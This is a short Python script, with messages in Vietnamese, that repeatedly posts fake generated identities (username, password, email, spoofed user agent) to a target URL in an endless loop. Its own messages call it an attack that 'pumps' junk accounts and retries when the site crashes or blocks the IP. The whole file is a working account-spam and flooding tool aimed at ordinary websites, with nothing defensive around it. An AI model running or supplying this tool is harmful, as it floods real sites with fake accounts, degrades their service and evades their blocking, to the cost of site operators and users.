import requests
import time
from core.identity_gen import gen_fake_identity
from colorama import Fore

def start_spam(url):
    print(Fore.YELLOW + f"[*] Đang tấn công mục tiêu: {url}")
    count = 0
    while True:
        identity = gen_fake_identity()
        data = {
            "user": identity["user"],
            "pass": identity["pass"],
            "email": identity["email"]
        }
        headers = {"User-Agent": identity["ua"]}
        
        try:
            res = requests.post(url, data=data, headers=headers, timeout=5)
            count += 1
            print(Fore.GREEN + f"[+] Đã bơm thành công {count} tài khoản rác. Status: {res.status_code}")
        except:
            print(Fore.RED + "[!] Web có dấu hiệu sập hoặc đã chặn IP. Đang thử lại...")
            time.sleep(2)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        start_spam(sys.argv[1])
      
